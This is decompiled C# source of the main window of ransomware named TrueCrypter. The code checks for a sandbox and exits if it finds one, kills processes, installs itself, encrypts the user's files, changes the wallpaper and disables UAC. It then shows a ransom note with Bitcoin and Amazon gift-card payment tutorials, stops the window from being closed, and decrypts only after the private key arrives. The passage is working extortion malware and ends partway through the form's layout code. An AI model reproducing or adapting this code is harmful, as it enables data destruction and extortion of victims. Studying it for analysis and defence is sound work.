using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using TrueCrypter.Config;
using TrueCrypter.Properties;
using TrueCrypter.Ransomware.Core.Wrappers;

namespace TrueCrypter.Ransomware.Core.Forms;

public class frmMain : Form
{
	private IContainer components = null;

	private ToolStripMenuItem stripBtnFiles;

	private ToolStripMenuItem btnStripEmail;

	private ImageList MyImages;

	private TabControl tabMain;

	private RichTextBox txtInfos;

	private TabPage tabPageTrueCrypter;

	private Button btnNext;

	private Button btnBack;

	private TabPage tabPagePayment;

	private Label lblSelect;

	private ComboBox cmbPaymentMethods;

	private PictureBox ImgCurrentPaymentMethod;

	private Button btnPay;

	private Button btnQRCode;

	private TextBox txtTransactionId;

	private RichTextBox txtPaymentTutorial;

	private RichTextBox txtPaymentInstructions;

	private TabPage tabPageConfirmation;

	private RichTextBox txtConfirmation;

	private ProgressBar prgStatus;

	private RichTextBox txtStatus;

	private BackgroundWorker TransactionWorker;

	public frmMain()
	{
		InitializeComponent();
		Initialize();
	}

	private void Initialize()
	{
		if (TrueCrypter.SandBoxie.IsSandBoxed())
		{
			Environment.Exit(1);
		}
		TrueCrypter.ProcessKiller.Start();
		if (!Directory.Exists(global::TrueCrypter.Config.Settings.TrueCrypterPath))
		{
			Directory.CreateDirectory(global::TrueCrypter.Config.Settings.TrueCrypterPath);
		}
		if (!File.Exists(global::TrueCrypter.Config.Settings.TrueCrypterPath + "TrueCrypter.xml"))
		{
			File.WriteAllText(global::TrueCrypter.Config.Settings.TrueCrypterPath + "TrueCrypter.xml", Resources.TrueCrypter);
		}
		if (!File.Exists(global::TrueCrypter.Config.Settings.TrueCrypterPath + "TrueCrypter.exe"))
		{
			TrueCrypter.Install();
		}
		global::TrueCrypter.Config.Settings.Load();
		global::TrueCrypter.Config.Settings.Sync();
		if (!global::TrueCrypter.Config.Settings.Encrypted)
		{
			global::TrueCrypter.Config.Settings.PublicKey = TrueCrypter.encrypter.PublicKey;
			global::TrueCrypter.Config.Settings.Save();
			TrueCrypter.EncryptFiles();
			global::TrueCrypter.Config.Settings.Encrypted = true;
			global::TrueCrypter.Config.Settings.Wallpaper = Windows.GetDesktopWallpaper();
			((Image)Resources.background).Save(global::TrueCrypter.Config.Settings.TrueCrypterPath + "background.jpg");
			Windows.SetDesktopWallpaper(global::TrueCrypter.Config.Settings.TrueCrypterPath + "background.jpg");
			global::TrueCrypter.Config.Settings.Save();
		}
		else
		{
			TrueCrypter.EncryptedFiles = new HashSet<string>(File.ReadAllLines(global::TrueCrypter.Config.Settings.TrueCrypterPath + "Encrypted.dat"));
		}
		if (Windows.IsProcessElevated())
		{
			Windows.DisableUAC();
		}
		Render();
	}

	private void Render()
	{
		DisplayInfos();
		DisplayInstructions();
		DisplayConfirmation();
	}

	private void DisplayInfos()
	{
		((TextBoxBase)txtInfos).Clear();
		AppendText(txtInfos, "> What happened?\n", Color.Red, (FontStyle)3);
		AppendText(txtInfos, "All your ", Color.Black, (FontStyle)0);
		AppendText(txtInfos, "important documents ", Color.Black, (FontStyle)1);
		AppendText(txtInfos, "on this computer (Images, Videos, etc.) were ", Color.Black, (FontStyle)0);
		AppendText(txtInfos, "encrypted ", Color.Black, (FontStyle)1);
		AppendText(txtInfos, "using an unique ", Color.Black, (FontStyle)0);
		AppendText(txtInfos, "RSA-2048 Public Key.\n\n", Color.Black, (FontStyle)1);
		AppendText(txtInfos, "> How can I restore my files?\n", Color.Red, (FontStyle)3);
		AppendText(txtInfos, "In order to decrypt your files you need your ", Color.Black, (FontStyle)0);
		AppendText(txtInfos, "Private Key", Color.Black, (FontStyle)1);
		AppendText(txtInfos, ", which is situated on our hidden server. The only way to obtain it, is by paying a sum of money. Without the key, there is no way to unlock your files.\n\n", Color.Black, (FontStyle)0);
		AppendText(txtInfos, "> How can I pay?\n", Color.Red, (FontStyle)3);
		AppendText(txtInfos, "We currently accept payments in ", Color.Black, (FontStyle)0);
		AppendText(txtInfos, "Bitcoins ", Color.Black, (FontStyle)1);
		AppendText(txtInfos, "or ", Color.Black, (FontStyle)0);
		AppendText(txtInfos, "AGCs (Amazon Gift Cards)", Color.Black, (FontStyle)1);
		AppendText(txtInfos, ".\n\n", Color.Black, (FontStyle)0);
		AppendText(txtInfos, "Getting started with Bitcoins: https://bitcoin.org/en/getting-started\n", Color.Blue, (FontStyle)2);
	}

	private void DisplayInstructions()
	{
		((TextBoxBase)txtPaymentInstructions).Clear();
		((TextBoxBase)txtPaymentTutorial).Clear();
		string paymentMethod = global::TrueCrypter.Config.Settings.PaymentMethod;
		if (!(paymentMethod == "Bitcoin"))
		{
			if (paymentMethod == "Amazon")
			{
				AppendText(txtPaymentInstructions, "You have to buy a ", Color.Black, (FontStyle)0);
				AppendText(txtPaymentInstructions, global::TrueCrypter.Config.Settings.AmazonAmount + " USD ", Color.Black, (FontStyle)1);
				AppendText(txtPaymentInstructions, "Amazon Gift Card, and specify the Gift Code onto the next page. Make sure you buy it from the ", Color.Black, (FontStyle)0);
				AppendText(txtPaymentInstructions, ".com ", Color.Black, (FontStyle)1);
				AppendText(txtPaymentInstructions, "domain!", Color.Black, (FontStyle)0);
				AppendText(txtPaymentTutorial, ">Tutorial\n", Color.Red, (FontStyle)3);
				AppendText(txtPaymentTutorial, "1) ", Color.Black, (FontStyle)1);
				AppendText(txtPaymentTutorial, "Navigate to the following Url: https://www.amazon.com/gp/product/B004LLIKVU\n", Color.Black, (FontStyle)0);
				AppendText(txtPaymentTutorial, "2) ", Color.Black, (FontStyle)1);
				AppendText(txtPaymentTutorial, "Enter an amount of ", Color.Black, (FontStyle)0);
				AppendText(txtPaymentTutorial, "a USD.\n", Color.Black, (FontStyle)1);
				AppendText(txtPaymentTutorial, "3) ", Color.Black, (FontStyle)1);
				AppendText(txtPaymentTutorial, "Enter your email and a fake/real name.\n", Color.Black, (FontStyle)0);
				AppendText(txtPaymentTutorial, "4) ", Color.Black, (FontStyle)1);
				AppendText(txtPaymentTutorial, "Click \"", Color.Black, (FontStyle)0);
				AppendText(txtPaymentTutorial, "Proceed to Checkout", Color.Black, (FontStyle)1);
				AppendText(txtPaymentTutorial, "\".", Color.Black, (FontStyle)0);
				AppendText(txtPaymentTutorial, "\n5) ", Color.Black, (FontStyle)1);
				AppendText(txtPaymentTutorial, "After you completed the payment, specify the ", Color.Black, (FontStyle)0);
				AppendText(txtPaymentTutorial, "Gift Code ", Color.Black, (FontStyle)1);
				AppendText(txtPaymentTutorial, "from your email down here.", Color.Black, (FontStyle)0);
			}
		}
		else
		{
			AppendText(txtPaymentInstructions, "You have to send EXACTLY ", Color.Black, (FontStyle)0);
			AppendText(txtPaymentInstructions, global::TrueCrypter.Config.Settings.BitcoinAmount + " BTC ", Color.Black, (FontStyle)1);
			AppendText(txtPaymentInstructions, "to the following address: ", Color.Black, (FontStyle)0);
			AppendText(txtPaymentInstructions, global::TrueCrypter.Config.Settings.BitcoinAddress, Color.Black, (FontStyle)1);
			AppendText(txtPaymentInstructions, " and specify the Transaction ID on the next page, which will be verified and confirmed.", Color.Black, (FontStyle)0);
			AppendText(txtPaymentTutorial, ">Tutorial\n", Color.Red, (FontStyle)3);
			AppendText(txtPaymentTutorial, "1) ", Color.Black, (FontStyle)1);
			AppendText(txtPaymentTutorial, "Create a ", Color.Black, (FontStyle)0);
			AppendText(txtPaymentTutorial, "Bitcoin Wallet ", Color.Black, (FontStyle)1);
			AppendText(txtPaymentTutorial, "(We suggest: www.blockchain.info).\n", Color.Black, (FontStyle)0);
			AppendText(txtPaymentTutorial, "2) ", Color.Black, (FontStyle)1);
			AppendText(txtPaymentTutorial, "Buy some ", Color.Black, (FontStyle)0);
			AppendText(txtPaymentTutorial, "Bitcoins ", Color.Black, (FontStyle)1);
			AppendText(txtPaymentTutorial, "(We suggest: www.localbitcoins.com, www.coincafe.com).\n", Color.Black, (FontStyle)0);
			AppendText(txtPaymentTutorial, "3) ", Color.Black, (FontStyle)1);
			AppendText(txtPaymentTutorial, "Send ", Color.Black, (FontStyle)0);
			AppendText(txtPaymentTutorial, global::TrueCrypter.Config.Settings.BitcoinAmount, Color.Black, (FontStyle)1);
			AppendText(txtPaymentTutorial, " BTCs to ", Color.Black, (FontStyle)0);
			AppendText(txtPaymentTutorial, global::TrueCrypter.Config.Settings.BitcoinAddress + "\n", Color.Black, (FontStyle)1);
			AppendText(txtPaymentTutorial, "4) ", Color.Black, (FontStyle)1);
			AppendText(txtPaymentTutorial, "After you sent the Bitcoins, specify the ", Color.Black, (FontStyle)0);
			AppendText(txtPaymentTutorial, "Transaction ID ", Color.Black, (FontStyle)1);
			AppendText(txtPaymentTutorial, "down here.", Color.Black, (FontStyle)0);
		}
	}

	private void DisplayConfirmation()
	{
		((TextBoxBase)txtConfirmation).Clear();
		AppendText(txtConfirmation, "Transaction succesfully submitted. Payments are processed manually, therefore it may take up to 24-48 hours to validate.\nAfter your payment is processed, TrueCrypter will automatically start decrypting your files.", Color.Red, (FontStyle)3);
		((TextBoxBase)txtStatus).Clear();
		AppendText(txtStatus, "Status: ", Color.Black, (FontStyle)1);
		AppendText(txtStatus, "Not yet confirmed.", Color.Black, (FontStyle)2);
	}

	private void AppendText(RichTextBox MyRichTextBox, string Text, Color Color, FontStyle Font)
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		((TextBoxBase)MyRichTextBox).set_SelectionStart(((TextBoxBase)MyRichTextBox).get_TextLength());
		((TextBoxBase)MyRichTextBox).set_SelectionLength(0);
		MyRichTextBox.set_SelectionColor(Color);
		MyRichTextBox.set_SelectionFont(new Font(((Control)MyRichTextBox).get_Font(), Font));
		((TextBoxBase)MyRichTextBox).AppendText(Text);
		MyRichTextBox.set_SelectionColor(((Control)MyRichTextBox).get_ForeColor());
		MyRichTextBox.set_SelectionFont(new Font(((Control)MyRichTextBox).get_Font(), (FontStyle)0));
	}

	private void frmMain_Load(object sender, EventArgs e)
	{
		Control.set_CheckForIllegalCrossThreadCalls(false);
		if (!global::TrueCrypter.Config.Settings.Submitted)
		{
			foreach (TabPage item in from TabPage page in (IEnumerable)tabMain.get_TabPages()
				where page != tabPageTrueCrypter
				select page)
			{
				tabMain.get_TabPages().Remove(item);
			}
			Render();
			((ListControl)cmbPaymentMethods).set_SelectedIndex(0);
			return;
		}
		foreach (TabPage item2 in from TabPage page in (IEnumerable)tabMain.get_TabPages()
			where page != tabPageConfirmation
			select page)
		{
			tabMain.get_TabPages().Remove(item2);
		}
		TransactionWorker.RunWorkerAsync();
		Render();
		((Control)btnNext).set_Visible(false);
	}

	private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (!TrueCrypter.Unlocked)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void TransactionWorker_DoWork(object sender, DoWorkEventArgs e)
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		string privateKey;
		while (true)
		{
			privateKey = TrueCrypter.GetPrivateKey(global::TrueCrypter.Config.Settings.PublicKey);
			if (global::TrueCrypter.Config.Settings.Submitted)
			{
				if (privateKey.ToLower().Contains("invalid"))
				{
					MessageBox.Show((IWin32Window)(object)this, "The transaction ID you submitted is invalid, please retry.", "Invalid", (MessageBoxButtons)0, (MessageBoxIcon)48);
					tabMain.get_TabPages().Add(tabPageTrueCrypter);
					tabMain.get_TabPages().Remove(tabPageConfirmation);
					Render();
					global::TrueCrypter.Config.Settings.Submitted = false;
					global::TrueCrypter.Config.Settings.Save();
					global::TrueCrypter.Config.Settings.Load();
					((ListControl)cmbPaymentMethods).set_SelectedIndex(0);
					((Control)btnNext).set_Visible(true);
					TransactionWorker.CancelAsync();
				}
				else if (privateKey != string.Empty)
				{
					break;
				}
				Thread.Sleep(60000);
			}
		}
		Render();
		((TextBoxBase)txtStatus).Clear();
		AppendText(txtStatus, "Status: ", Color.Black, (FontStyle)1);
		AppendText(txtStatus, "Confirmed.\nNow decrypting...", Color.Black, (FontStyle)2);
		global::TrueCrypter.Config.Settings.Load();
		TrueCrypter.DecryptFiles(privateKey);
		AppendText(txtStatus, "\nSuccessfully decrypted.", Color.Red, (FontStyle)3);
		MessageBox.Show((IWin32Window)(object)this, "Recovery is completed and your files are safe. TrueCrypter will now uninstall itself.", "Completed", (MessageBoxButtons)0, (MessageBoxIcon)64);
		TrueCrypter.Uninstall();
	}

	private void stripBtnFiles_Click(object sender, EventArgs e)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		frmFiles frmFiles2 = new frmFiles(TrueCrypter.EncryptedFiles.ToList());
		((Form)frmFiles2).ShowDialog();
	}

	private void cmbPaymentMethods_SelectedIndexChanged(object sender, EventArgs e)
	{
		switch (((ListControl)cmbPaymentMethods).get_SelectedIndex())
		{
		case 1:
			global::TrueCrypter.Config.Settings.PaymentMethod = "Amazon";
			ImgCurrentPaymentMethod.set_Image((Image)(object)Resources.amazon);
			((Control)txtTransactionId).set_Size(new Size(382, 20));
			((Control)txtTransactionId).set_Text("Enter the Gift Code here.");
			((Control)btnQRCode).set_Visible(false);
			break;
		case 0:
			global::TrueCrypter.Config.Settings.PaymentMethod = "Bitcoin";
			ImgCurrentPaymentMethod.set_Image((Image)(object)Resources.bitcoin);
			((Control)txtTransactionId).set_Size(new Size(300, 20));
			((Control)txtTransactionId).set_Text("Enter the Transaction ID here.");
			((Control)btnQRCode).set_Visible(true);
			break;
		}
		Render();
	}

	private void btnNext_Click(object sender, EventArgs e)
	{
		tabMain.get_TabPages().Remove(tabPageTrueCrypter);
		tabMain.get_TabPages().Add(tabPagePayment);
		((Control)btnBack).set_Visible(true);
		((Control)btnNext).set_Visible(false);
	}

	private void btnBack_Click(object sender, EventArgs e)
	{
		tabMain.get_TabPages().Remove(tabPagePayment);
		tabMain.get_TabPages().Add(tabPageTrueCrypter);
		((Control)btnBack).set_Visible(false);
		((Control)btnNext).set_Visible(true);
	}

	private void btnPay_Click(object sender, EventArgs e)
	{
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Invalid comparison between Unknown and I4
		if (((Control)txtTransactionId).get_Text() == string.Empty)
		{
			string paymentMethod = global::TrueCrypter.Config.Settings.PaymentMethod;
			if (!(paymentMethod == "Bitcoin"))
			{
				if (paymentMethod == "Amazon")
				{
					MessageBox.Show("Enter the Gift Code.");
				}
			}
			else
			{
				MessageBox.Show("Enter the Transaction ID.");
			}
		}
		else if ((int)MessageBox.Show((IWin32Window)(object)this, "Are you sure you entered the payment information correctly?", "Attention!", (MessageBoxButtons)4, (MessageBoxIcon)48) != 7)
		{
			TrueCrypter.SubmitTransaction(((Control)txtTransactionId).get_Text(), global::TrueCrypter.Config.Settings.PaymentMethod, global::TrueCrypter.Config.Settings.PublicKey);
			tabMain.get_TabPages().Remove(tabPagePayment);
			tabMain.get_TabPages().Add(tabPageConfirmation);
			((Control)btnBack).set_Visible(false);
			global::TrueCrypter.Config.Settings.Submitted = true;
			global::TrueCrypter.Config.Settings.Save();
			if (!TransactionWorker.IsBusy)
			{
				TransactionWorker.RunWorkerAsync();
			}
			Render();
		}
	}

	private void btnQRCode_Click(object sender, EventArgs e)
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		frmQRCode obj = new frmQRCode();
		((Form)obj).set_Owner((Form)(object)this);
		frmQRCode frmQRCode2 = obj;
		((Form)frmQRCode2).ShowDialog();
	}

	private void btnStripEmail_Click(object sender, EventArgs e)
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show((IWin32Window)(object)this, "Email us for any problems: trueransom@mail2tor.com", "E-mail", (MessageBoxButtons)0, (MessageBoxIcon)64);
	}

	private void RichText_LinkClicked(object sender, LinkClickedEventArgs e)
	{
		Process.Start(e.get_LinkText());
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Expected O, but got Unknown
		//IL_0174: Unknown result type (might be due to invalid IL or missing references)
		//IL_017e: Expected O, but got Unknown
		//IL_0268: Unknown result type (might be due to invalid IL or missing references)
		//IL_0272: Expected O, but got Unknown
		//IL_0303: Unknown result type (might be due to invalid IL or missing references)
		//IL_030d: Expected O, but got Unknown
		//IL_0403: Unknown result type (might be due to invalid IL or missing references)
		//IL_04dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e6: Expected O, but got Unknown
		//IL_082d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0837: Expected O, but got Unknown
		//IL_0920: Unknown result type (might be due to invalid IL or missing references)
		//IL_092a: Expected O, but got Unknown
		//IL_09aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_09b4: Expected O, but got Unknown
		//IL_0ac5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0acf: Expected O, but got Unknown
		//IL_0c5a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c64: Expected O, but got Unknown
		//IL_0cd7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ce1: Expected O, but got Unknown
		//IL_0d60: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d6a: Expected O, but got Unknown
		//IL_0f4a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f54: Expected O, but got Unknown
		//IL_0f87: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f91: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmMain));
		stripBtnFiles = new ToolStripMenuItem();
		btnStripEmail = new ToolStripMenuItem();
		MyImages = new ImageList(components);
		tabPageTrueCrypter = new TabPage();
		txtInfos = new RichTextBox();
		tabMain = new TabControl();
		tabPagePayment = new TabPage();
		btnPay = new Button();
		btnQRCode = new Button();
		txtTransactionId = new TextBox();
		txtPaymentTutorial = new RichTextBox();
		txtPaymentInstructions = new RichTextBox();
		lblSelect = new Label();
		cmbPaymentMethods = new ComboBox();
		ImgCurrentPaymentMethod = new PictureBox();
		tabPageConfirmation = new TabPage();
		prgStatus = new ProgressBar();
		txtStatus = new RichTextBox();
		txtConfirmation = new RichTextBox();
		btnNext = new Button();
		btnBack = new Button();
		TransactionWorker = new BackgroundWorker();
		MenuStrip val = new MenuStrip();
		ToolStripMenuItem val2 = new ToolStripMenuItem();
		((Control)val).SuspendLayout();
		((Control)tabPageTrueCrypter).SuspendLayout();
		((Control)tabMain).SuspendLayout();
		((Control)tabPagePayment).SuspendLayout();
		((ISupportInitialize)ImgCurrentPaymentMethod).BeginInit();
		((Control)tabPageConfirmation).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)val).set_AutoSize(false);
		((Control)val).set_Font(new Font("Segoe UI", 9f));
		((ToolStrip)val).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)stripBtnFiles,
			(ToolStripItem)val2
		});
		((ToolStrip)val).set_LayoutStyle((ToolStripLayoutStyle)1);
		((Control)val).set_Location(new Point(0, 0));
		((Control)val).set_Name("menuMain");
		((ToolStrip)val).set_RenderMode((ToolStripRenderMode)1);
		((Control)val).set_Size(new Size(464, 24));
		((Control)val).set_TabIndex(12);
		((Control)val).set_Text("menuStrip1");
		((ToolStripItem)stripBtnFiles).set_Image((Image)(object)Resources.file);
		((ToolStripItem)stripBtnFiles).set_Name("stripBtnFiles");
		((ToolStripItem)stripBtnFiles).set_Size(new Size(58, 20));
		((ToolStripItem)stripBtnFiles).set_Text("Files");
		((ToolStripItem)stripBtnFiles).add_Click((EventHandler)stripBtnFiles_Click);
		((ToolStripDropDownItem)val2).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)btnStripEmail });
		((ToolStripItem)val2).set_Image((Image)componentResourceManager.GetObject("btnStripContact.Image"));
		((ToolStripItem)val2).set_Name("btnStripContact");
		((ToolStripItem)val2).set_Size(new Size(93, 20));
		((ToolStripItem)val2).set_Text("Contact Us");
		((ToolStripItem)btnStripEmail).set_Image((Image)(object)Resources.email);
		((ToolStripItem)btnStripEmail).set_Name("btnStripEmail");
		((ToolStripItem)btnStripEmail).set_Size(new Size(108, 22));
		((ToolStripItem)btnStripEmail).set_Text("E-mail");
		((ToolStripItem)btnStripEmail).add_Click((EventHandler)btnStripEmail_Click);
		MyImages.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("MyImages.ImageStream"));
		MyImages.set_TransparentColor(Color.Transparent);
		MyImages.get_Images().SetKeyName(0, "info.png");
		MyImages.get_Images().SetKeyName(1, "bitcoin.png");
		MyImages.get_Images().SetKeyName(2, "back.png");
		MyImages.get_Images().SetKeyName(3, "next.png");
		MyImages.get_Images().SetKeyName(4, "time.png");
		MyImages.get_Images().SetKeyName(5, "qr.png");
		MyImages.get_Images().SetKeyName(6, "pay.png");
		((Control)tabPageTrueCrypter).get_Controls().Add((Control)(object)txtInfos);
		tabPageTrueCrypter.set_ImageIndex(0);
		tabPageTrueCrypter.set_Location(new Point(4, 23));
		((Control)tabPageTrueCrypter).set_Name("tabPageTrueCrypter");
		((Control)tabPageTrueCrypter).set_Padding(new Padding(3));
		((Control)tabPageTrueCrypter).set_Size(new Size(456, 268));
		tabPageTrueCrypter.set_TabIndex(0);
		((Control)tabPageTrueCrypter).set_Text("TrueCrypter");
		tabPageTrueCrypter.set_UseVisualStyleBackColor(true);
		((Control)txtInfos).set_BackColor(Color.White);
		((Control)txtInfos).set_Dock((DockStyle)5);
		((Control)txtInfos).set_Location(new Point(3, 3));
		((Control)txtInfos).set_Name("txtInfos");
		((TextBoxBase)txtInfos).set_ReadOnly(true);
		((Control)txtInfos).set_Size(new Size(450, 262));
		((Control)txtInfos).set_TabIndex(1);
		((Control)txtInfos).set_Text("");
		txtInfos.add_LinkClicked(new LinkClickedEventHandler(RichText_LinkClicked));
		((Control)tabMain).get_Controls().Add((Control)(object)tabPageTrueCrypter);
		((Control)tabMain).get_Controls().Add((Control)(object)tabPagePayment);
		((Control)tabMain).get_Controls().Add((Control)(object)tabPageConfirmation);
		tabMain.set_ImageList(MyImages);
		((Control)tabMain).set_Location(new Point(0, 24));
		((Control)tabMain).set_Name("tabMain");
		tabMain.set_SelectedIndex(0);
		((Control)tabMain).set_Size(new Size(464, 295));
		((Control)tabMain).set_TabIndex(13);
		((Control)tabPagePayment).get_Controls().Add((Control)(object)btnPay);
		((Control)tabPagePayment).get_Controls().Add((Control)(object)btnQRCode);
		((Control)tabPagePayment).get_Controls().Add((Control)(object)txtTransactionId);
		((Control)tabPagePayment).get_Controls().Add((Control)(object)txtPaymentTutorial);
		((Control)tabPagePayment).get_Controls().Add((Control)(object)txtPaymentInstructions);
		((Control)tabPagePayment).get_Controls().Add((Control)(object)lblSelect);
		((Control)tabPagePayment).get_Controls().Add((Control)(object)cmbPaymentMethods);
		((Control)tabPagePayment).get_Controls().Add((Control)(object)ImgCurrentPaymentMethod);
		tabPagePayment.set_ImageIndex(1);
		tabPagePayment.set_Location(new Point(4, 23));
		((Control)tabPagePayment).set_Name("tabPagePayment");
		((Control)tabPagePayment).set_Size(new Size(456, 268));
		tabPagePayment.set_TabIndex(1);
		((Control)tabPagePayment).set_Text("Payment");
		tabPagePayment.set_UseVisualStyleBackColor(true);
		((ButtonBase)btnPay).set_ImageAlign((ContentAlignment)16);
		((ButtonBase)btnPay).set_ImageIndex(6);
		((ButtonBase)btnPay).set_ImageList(MyImages);
		((Control)btnPay).set_Location(new Point(396, 241));
		((Control)btnPay).set_Name("btnPay");
		((Control)btnPay).set_Size(new Size(52, 23));
		((Control)btnPay).set_TabIndex(16);
		((Control)btnPay).set_Text("Pay");
		((ButtonBase)btnPay).set_TextAlign((ContentAlignment)64);
		((ButtonBase)btnPay).set_UseVisualStyleBackColor(true);
		((Control)btnPay).add_Click((EventHandler)btnPay_Click);
		((ButtonBase)btnQRCode).set_ImageAlign((ContentAlignment)16);
		((ButtonBase)btnQRCode).set_ImageIndex(5);
		((ButtonBase)btnQRCode).set_ImageList(MyImages);
		((Control)btnQRCode).set_Location(new Point(314, 241));
		((Control)btnQRCode).set_Name("btnQRCode");
		((Control)btnQRCode).set_Size(new Size(76, 23));
		((Control)btnQRCode).set_TabIndex(15);
		((Control)btnQRCode).set_Text("QR Code");
		((ButtonBase)btnQRCode).set_TextAlign((ContentAlignment)64);
		((ButtonBase)btnQRCode).set_UseVisualStyleBackColor(true);
		((Control)btnQRCode).add_Click((EventHandler)btnQRCode_Click);
		((Control)txtTransactionId).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)txtTransactionId).set_Location(new Point(8, 242));
		((Control)txtTransactionId).set_Name("txtTransactionId");
		((Control)txtTransactionId).set_Size(new Size(300, 20));
		((Control)txtTransactionId).set_TabIndex(14);
		((Control)txtTransactionId).set_Text("Enter the Transaction ID here.");
		txtTransactionId.set_TextAlign((HorizontalAlignment)2);
		((Control)txtPaymentTutorial).set_BackColor(SystemColors.Control);
		((Control)txtPaymentTutorial).set_Location(new Point(8, 145));
		((Control)txtPaymentTutorial).set_Name("txtPaymentTutorial");
		((TextBoxBase)txtPaymentTutorial).set_ReadOnly(true);
		((Control)txtPaymentTutorial).set_Size(new Size(440, 90));
		((Control)txtPaymentTutorial).set_TabIndex(12);
		((Control)txtPaymentTutorial).set_Text("");
		txtPaymentTutorial.add_LinkClicked(new LinkClickedEventHandler(RichText_LinkClicked));
		((Control)txtPaymentInstructions).set_BackColor(SystemColors.Control);
		((Control)txtPaymentInstructions).set_Location(new Point(8, 87));
		((Control)txtPaymentInstructions).set_Name("txtPaymentInstructions");
		((TextBoxBase)txtPaymentInstructions).set_ReadOnly(true);
		((Control)txtPaymentInstructions).set_Size(new Size(440, 52));
		((Control)txtPaymentInstructions).set_TabIndex(13);
		((Control)txtPaymentInstructions).set_Text("");
		txtPaymentInstructions.add_LinkClicked(new LinkClickedEventHandler(RichText_LinkClicked));
		((Control)lblSelect).set_AutoSize(true);
		((Control)lblSelect).set_Location(new Point(5, 11));
		((Control)lblSelect).set_Name("lblSelect");
		((Control)lblSelect).set_Size(new Size(170, 13));
		((Control)lblSelect).set_TabIndex(4);
		((Control)lblSelect).set_Text("Please choose a payment method:");
		cmbPaymentMethods.set_DropDownStyle((ComboBoxStyle)2);
		((ListControl)cmbPaymentMethods).set_FormattingEnabled(true);
		cmbPaymentMethods.get_Items().AddRange(new object[2] { "Bitcoin", "Amazon" });
		((Control)cmbPaymentMethods).set_Location(new Point(177, 4));
		((Control)cmbPaymentMethods).set_Name("cmbPaymentMethods");
		((Control)cmbPaymentMethods).set_Size(new Size(271, 21));
		((Control)cmbPaymentMethods).set_TabIndex(3);
		cmbPaymentMethods.add_SelectedIndexChanged((EventHandler)cmbPaymentMethods_SelectedIndexChanged);
		ImgCurrentPaymentMethod.set_Image((Image)componentResourceManager.GetObject("ImgCurrentPaymentMethod.Image"));
		((Control)ImgCurrentPaymentMethod).set_Location(new Point(134, 30));
